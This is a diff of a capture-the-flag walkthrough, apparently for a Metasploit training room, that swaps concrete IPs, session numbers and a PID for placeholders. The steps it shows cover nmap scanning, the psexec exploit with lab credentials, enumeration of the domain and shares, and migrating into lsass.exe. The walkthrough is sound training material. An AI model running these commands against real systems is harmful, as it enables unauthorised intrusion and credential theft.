@@ -53,7 +53,7 @@ No answer needed
 
 We will be using nmap to gather information on the target system.
 ```
-nmap -sC -sV -oN nmap/initial 10.10.133.146
+nmap -sC -sV -oN nmap/initial TARGET_IP
 ```
 The output of the "initial" file we created under the "nmap" folder as follows:
 ```
@@ -108,8 +108,8 @@ As instructed, we can use the "exploit/windows/smb/psexec" module from the msfco
 ```
 msfconsole
 use exploit/windows/smb/psexec
-set LHOST LOCALIP
-set RHOSTS TARGETIP
+set LHOST LOCAL_IP
+set RHOSTS TARGET_IP
 set SMBUser ballen
 set SMBPass Password1
 run
@@ -144,7 +144,7 @@ The only setting we need for this one is "SESSION", the number of which we can f
 
 We set the session and run the exploit.
 ```
-set SESSION 1
+set SESSION SESSION_ID
 run
 ```
 The output shows the domain name.
@@ -163,7 +163,7 @@ use post/windows/gather/enum_shares
 ```
 Once again, the only setting we need before running the exploit is called "SESSION".
 ```
-set SESSION 1
+set SESSION SESSION_ID
 run
 ```
 ![image](https://user-images.githubusercontent.com/14150485/170660492-07368442-3ced-4838-bcdc-4455534c71e5.png)
@@ -178,7 +178,7 @@ speedster
 
 Resume the meterpreter session running in the background.
 ```
-session -i 1
+session -i SESSION_ID
 ```
 Per the hint on this task, we need to migrate the "lsass.exe" process. However, we first need to find its number.
 ```
@@ -188,7 +188,7 @@ ps aux | grep -iF 'lsass.exe'
 
 Now that we know what the "PID" number is we can proceed to migrate it as instructed.
 ```
-migrate PIDNUMBER
+migrate PID
 ```
 ![image](https://user-images.githubusercontent.com/14150485/170661843-3dd1bd2e-4bf9-4073-af8a-d8507644aeb1.png)
 
